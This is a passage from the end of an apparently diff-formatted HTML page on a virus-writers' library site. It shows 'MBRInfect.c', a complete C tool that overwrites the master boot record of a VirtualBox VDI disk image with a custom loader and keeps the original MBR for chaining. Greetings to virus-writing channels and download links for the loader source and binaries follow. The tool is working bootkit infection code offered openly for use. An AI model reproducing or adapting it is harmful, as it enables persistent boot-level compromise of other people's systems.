+<p>My example code simply acts like a "proxy", infact after interacting a bit with the user it passes the control to the true loader. For more look at BOOT KIT (http://www.rootkit.com/project.php?id=34). Here a simple tool to infect a VDI with my loader:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* MBRInfect.c */</span><br/>
+<span style="color: #808080; font-style: italic;">/* A simple tool to infect the MBR of a virtual disk by WarGame/DoomRiderz */</span><br/>
+<br/>
+<span style="color: #339933;">#include &lt;stdio.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;string.h&gt;</span><br/>
+<br/>
+main<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>argv<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FILE <span style="color: #339933;">*</span>in <span style="color: #339933;">=</span> NULL<span style="color: #339933;">,*</span>in1 <span style="color: #339933;">=</span> NULL<span style="color: #339933;">,*</span>out <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> buf<span style="color: black;">&#91;</span><span style="color: #0000dd;">512</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> buf1<span style="color: black;">&#91;</span><span style="color: #0000dd;">512</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> original<span style="color: black;">&#91;</span><span style="color: #0000dd;">512</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">==</span> NULL <span style="color: #339933;">||</span> argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span> <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Usage: %s &lt;vdi file&gt; &lt;offdata of the vdi&gt;<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>in <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;loader.bin&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;can't open loader.bin<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>out <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r+&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;can't open %s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>in1 <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;loader1.bin&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;can't open loader1.bin<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span>buf<span style="color: #339933;">,</span><span style="color: #0000dd;">512</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>in<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span>buf1<span style="color: #339933;">,</span><span style="color: #0000dd;">512</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>in1<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>out<span style="color: #339933;">,</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/atoi.html"><span style="color: #000066;">atoi</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span>SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* seek to MBR pointed by offData */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span>original<span style="color: #339933;">,</span><span style="color: #0000dd;">512</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>out<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* read the original mbr */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>out<span style="color: #339933;">,-</span><span style="color: #0000dd;">512</span><span style="color: #339933;">,</span>SEEK_CUR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span>buf<span style="color: #339933;">+</span><span style="color: #0000dd;">446</span><span style="color: #339933;">,</span>original<span style="color: #339933;">+</span><span style="color: #0000dd;">446</span><span style="color: #339933;">,</span><span style="color: #0000dd;">64</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* put the partition table in our loader */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span>buf<span style="color: #339933;">,</span><span style="color: #0000dd;">512</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>out<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* write loader (sector 1) */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span>buf1<span style="color: #339933;">,</span><span style="color: #0000dd;">512</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>out<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* write loader 1 (sector 2) */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span>original<span style="color: #339933;">,</span><span style="color: #0000dd;">512</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>out<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* write original mbr (sector 3) */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>in<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>out<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>in1<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Done<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<h2>7) Greetz &amp; References</h2>
+<p>greetz to all people on #eof-project, #virus, #vxcode @ undernet</p>
+<p>References:</p>
+<ul>
+<li>http://www.virtualbox.org/</li>
+<li>http://www.virtualbox.org/browser/trunk/src/VBox/Devices/Storage/VDICore.h</li>
+<li>http://www.rootkit.com/project.php?id=34</li>
+<li>http://vx.netlux.org/lib/static/vdat/tufirstb.htm</li>
+</ul>
+<p>For more info, visit: http://vx.netlux.org/wargamevx or send me a mail to: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6116001306000c045958211800090e0e4f0815">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
+<p>Files for this article:</p>
+<ul>
+<li><a href="files/vwg03/DumpVDI.c">DumpVDI.c</a></li>
+<li><a href="files/vwg03/loader1.asm">loader1.asm</a></li>
+<li><a href="files/vwg03/loader1.bin">loader1.bin</a></li>
+<li><a href="files/vwg03/loader.asm">loader.asm</a></li>
+<li><a href="files/vwg03/loader.bin">loader.bin</a></li>
+<li><a href="files/vwg03/MBRInfect.c">MBRInfect.c</a></li>
+</ul>
+[<a style="" href="/lib/?lang=EN&amp;index=VT#vwg03">Back to index</a>] [<a href="/lib/vwg03.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vwg03">de</a><a href="/lib/index.php?lang=en&amp;id=vwg03">en</a><a href="/lib/index.php?lang=es&amp;id=vwg03">es</a><a href="/lib/index.php?lang=it&amp;id=vwg03">it</a><a href="/lib/index.php?lang=fr&amp;id=vwg03">fr</a><a href="/lib/index.php?lang=pl&amp;id=vwg03">pl</a><a href="/lib/index.php?lang=ru&amp;id=vwg03">ru</a><a href="/lib/index.php?lang=ua&amp;id=vwg03">ua</a></div>
+</body>
+</html>
